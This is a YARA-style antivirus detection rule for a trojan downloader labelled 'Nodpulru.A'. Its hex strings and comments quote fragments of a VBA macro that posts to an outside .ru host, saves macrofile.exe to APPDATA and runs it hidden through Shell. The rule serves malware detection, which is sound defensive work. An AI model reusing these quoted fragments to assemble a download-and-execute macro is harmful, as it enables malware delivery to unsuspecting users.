
rule TrojanDownloader_Linux_Nodpulru_A{
	meta:
		description = "TrojanDownloader:Linux/Nodpulru.A,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_00_0 = {4d 79 48 74 74 70 73 2e 4f 70 65 6e 20 22 50 4f 53 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f 70 75 6c 69 6e 6b 6f 76 6f 2e 72 75 2f 69 6e 64 65 78 2e 70 68 70 22 2c 20 46 61 6c 73 65 } //1 MyHttps.Open "POST", "https://pulinkovo.ru/index.php", False
		$a_00_1 = {4d 79 48 74 74 70 73 2e 73 65 74 52 65 71 75 65 73 74 48 65 61 64 65 72 20 22 52 65 66 65 72 65 72 22 2c 20 22 6e 6f 64 2d 68 75 69 73 6f 73 65 74 2e 73 6b 22 } //1 MyHttps.setRequestHeader "Referer", "nod-huisoset.sk"
		$a_00_2 = {54 65 6d 70 46 69 6c 65 4e 61 6d 65 20 3d 20 45 6e 76 69 72 6f 6e 28 22 41 50 50 44 41 54 41 22 29 } //1 TempFileName = Environ("APPDATA")
		$a_00_3 = {54 65 6d 70 46 69 6c 65 4e 61 6d 65 20 3d 20 54 65 6d 70 46 69 6c 65 4e 61 6d 65 20 26 20 22 2f 6d 61 63 72 6f 66 69 6c 65 2e 65 78 65 22 } //1 TempFileName = TempFileName & "/macrofile.exe"
		$a_00_4 = {53 68 65 6c 6c 20 54 65 6d 70 46 69 6c 65 4e 61 6d 65 2c 20 76 62 4e 6f 72 6d 61 6c 4e 6f 46 6f 63 75 73 } //1 Shell TempFileName, vbNormalNoFocus
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1+(#a_00_2  & 1)*1+(#a_00_3  & 1)*1+(#a_00_4  & 1)*1) >=5
 
}